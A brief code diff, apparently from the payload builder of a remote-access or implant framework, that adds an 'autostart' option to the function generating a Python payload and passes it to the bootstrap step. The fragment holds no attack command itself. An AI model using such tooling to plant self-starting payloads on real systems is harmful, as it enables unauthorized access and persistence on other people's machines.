@@ -20,7 +20,7 @@ def getLinuxImportedModules():
     return lines
 
 
-def pack_py_payload(display, conf, debug=False):
+def pack_py_payload(display, conf, debug=False, autostart=True):
     display(Success('Generating PY payload ...'))
 
     stdlib = dependencies.importer((
@@ -35,7 +35,9 @@ def pack_py_payload(display, conf, debug=False):
         ), path=ROOT, as_dict=True)
     )
 
-    payload = dependencies.bootstrap(stdlib, conf) + '\n'
+    payload = dependencies.bootstrap(
+        stdlib, conf, autostart
+    ) + '\n'
 
     if debug:
         return payload
